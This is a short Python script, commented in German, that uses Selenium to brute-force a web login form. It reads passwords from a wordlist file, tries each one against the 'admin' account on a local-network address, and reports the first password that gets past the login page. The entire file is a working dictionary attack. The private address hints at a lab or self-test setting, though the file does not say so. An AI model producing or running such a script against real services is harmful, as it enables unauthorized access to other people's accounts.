from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

from time import sleep


# WebDriver-Instanz erstellen
driver = webdriver.Chrome()  # Stelle sicher, dass der Pfad zum Chromedriver korrekt ist

# Webseite öffnen
driver.get("http://192.168.178.46:5000/login")

# Passwörter aus einer Datei lesen
try:
    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file]
except FileNotFoundError:
    print("Die Datei wurde nicht gefunden. Bitte überprüfe den Pfad und den Dateinamen.")
    driver.quit()
    exit()

for password in passwords:
    print("Testing this password:", password)

    res = driver.find_elements(By.CLASS_NAME, "form-control")
    res[0].clear()
    res[0].send_keys("admin")
    res[1].clear()
    res[1].send_keys(password)

    #sleep(2)

    button = driver.find_element(By.ID, "loginButton")
    button.click()

    if driver.title != "Login":
        print(f"Password is {password}")
        break

driver.quit()
exit()


